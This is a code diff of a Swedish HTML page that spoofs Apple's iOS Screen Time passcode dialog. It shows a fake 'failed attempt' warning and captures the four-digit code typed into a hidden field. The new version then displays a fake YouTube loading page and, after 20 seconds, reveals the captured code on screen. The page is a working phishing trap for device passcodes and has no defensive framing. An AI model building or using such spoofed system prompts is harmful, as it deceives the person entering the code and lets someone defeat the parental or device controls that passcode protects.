@@ -1,174 +1,113 @@
 <!DOCTYPE html>
 <html lang="sv">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Ange lösenkod för Skärmtid</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Skärmtid</title>
+    <style>
+        /* Grunddesign */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", Arial, sans-serif;
+            background-color: #000;
+            margin: 0;
+            height: 100vh;
+            overflow: hidden;
+            user-select: none;
+            display: flex;
+            justify-content: center;
+        }
 
-<style>
-body {
-    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Helvetica Neue", Arial, sans-serif;
-    background-color: #000;
-    margin: 0;
-    padding-top: 20px;
-    height: 100vh;
-    box-sizing: border-box;
-    display: flex;
-    flex-direction: column;
-    overflow: hidden;
-    user-select: none;
-}
+        /* Låsskärm */
+        #login-page {
+            background-color: #1c1c1e;
+            width: 100%;
+            max-width: 450px;
+            height: 100%;
+            border-radius: 40px 40px 0 0;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
 
-.modal-sheet {
-    background-color: #1c1c1e;
-    flex-grow: 1;
-    border-radius: 40px 40px 0 0;
-    position: relative;
-    width: 100%;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-}
+        .pincode-section { margin-top: 170px; text-align: center; }
+        .section-title { font-size: 17px; font-weight: 600; color: white; margin-bottom: 35px; }
+        
+        .dots-container { display: flex; gap: 24px; margin-bottom: 40px; }
+        .dot { width: 15px; height: 15px; border: 1.5px solid white; border-radius: 50%; }
+        .dot.active { background-color: white; }
 
-.close-btn {
-    position: absolute;
-    top: 20px;
-    right: 20px;
-    width: 32px;
-    height: 32px;
-    background-color: #3a3a3c;
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    color: white;
-}
+        .error-pill {
+            background-color: #ff3b30;
+            color: white;
+            padding: 6px 18px;
+            border-radius: 50px;
+            font-size: 13px;
+        }
 
-.close-btn svg {
-    width: 14px;
-    height: 14px;
-    stroke: white;
-    stroke-width: 2.2;
-    fill: none;
-}
+        /* Fake YouTube-sida */
+        #fake-youtube {
+            display: none;
+            background: #0f0f0f;
+            color: white;
+            width: 100%;
+            height: 100vh;
+            padding: 20px;
+            box-sizing: border-box;
+        }
 
-.pincode-section {
-    margin-top: 170px;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-}
-
-.section-title {
-    font-size: 17px;
-    font-weight: 600;
-    color: white;
-    margin-bottom: 35px;
-}
-
-.dots-container {
-    display: flex;
-    gap: 24px;
-    margin-bottom: 40px;
-}
-
-.dot {
-    width: 15px;
-    height: 15px;
-    border: 1.5px solid white;
-    border-radius: 50%;
-}
-
-.dot.active {
-    background-color: white;
-}
-
-.error-pill {
-    background-color: #ff3b30;
-    color: white;
-    padding: 6px 18px;
-    border-radius: 50px;
-    font-size: 13px;
-    font-weight: 400;
-}
-
-#hidden-input {
-    position: absolute;
-    opacity: 0;
-}
-</style>
-
+        #hidden-input { position: absolute; opacity: 0; }
+    </style>
 </head>
+<body onclick="document.getElementById('hidden-input').focus()">
 
-<body>
+    <div id="login-page">
+        <div class="pincode-section">
+            <div class="section-title">Ange lösenkod för Skärmtid</div>
+            <div class="dots-container">
+                <div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div>
+            </div>
+            <div class="error-pill">1 misslyckat lösenkodsförsök</div>
+        </div>
+    </div>
 
-<div class="modal-sheet" onclick="focusInput()">
+    <div id="fake-youtube">
+        <h1 style="font-family: sans-serif;">YouTube</h1>
+        <div style="background: #333; height: 200px; width: 100%; border-radius: 10px;"></div>
+        <p>Video laddar...</p>
+        <h2 id="revealed-code" style="color: #ff3b30; margin-top: 50px;"></h2>
+    </div>
 
-<div class="close-btn">
-<svg viewBox="0 0 24 24">
-<line x1="4" y1="4" x2="20" y2="20"></line>
-<line x1="20" y1="4" x2="4" y2="20"></line>
-</svg>
-</div>
+    <input type="tel" id="hidden-input" maxlength="4">
 
-<div class="pincode-section">
+    <script>
+        const input = document.getElementById("hidden-input");
+        const dots = document.querySelectorAll(".dot");
+        const loginPage = document.getElementById("login-page");
+        const fakeYoutube = document.getElementById("fake-youtube");
+        const revealedCode = document.getElementById("revealed-code");
 
-<div class="section-title">
-Ange lösenkod för Skärmtid
-</div>
+        input.focus();
 
-<div class="dots-container">
-<div class="dot"></div>
-<div class="dot"></div>
-<div class="dot"></div>
-<div class="dot"></div>
-</div>
+        input.addEventListener("input", () => {
+            let length = input.value.length;
+            dots.forEach((dot, index) => {
+                dot.classList.toggle("active", index < length);
+            });
 
-<div class="error-pill">
-1 misslyckat lösenkodsförsök
-</div>
-
-</div>
-</div>
-
-
-<input type="tel" id="hidden-input" maxlength="4">
-
-
-<script>
-const input = document.getElementById("hidden-input");
-const dots = document.querySelectorAll(".dot");
-
-window.onload = () => {
-    input.focus();
-};
-
-function focusInput(){
-    input.focus();
-}
-
-input.addEventListener("input", () => {
-
-let length = input.value.length;
-
-dots.forEach((dot,index)=>{
-    if(index < length){
-        dot.classList.add("active");
-    } else {
-        dot.classList.remove("active");
-    }
-});
-
-if(length === 4){
-
-setTimeout(()=>{
-window.location.href="https://www.youtube.com";
-},300);
-
-}
-
-});
-</script>
-
+            if(length === 4) {
+                let theCode = input.value;
+                setTimeout(() => {
+                    loginPage.style.display = "none";
+                    fakeYoutube.style.display = "block";
+                    
+                    // Vänta 20 sekunder och visa koden
+                    setTimeout(() => {
+                        revealedCode.innerText = "Koden du skrev in var: " + theCode;
+                    }, 20000); 
+                }, 300);
+            }
+        });
+    </script>
 </body>
 </html>
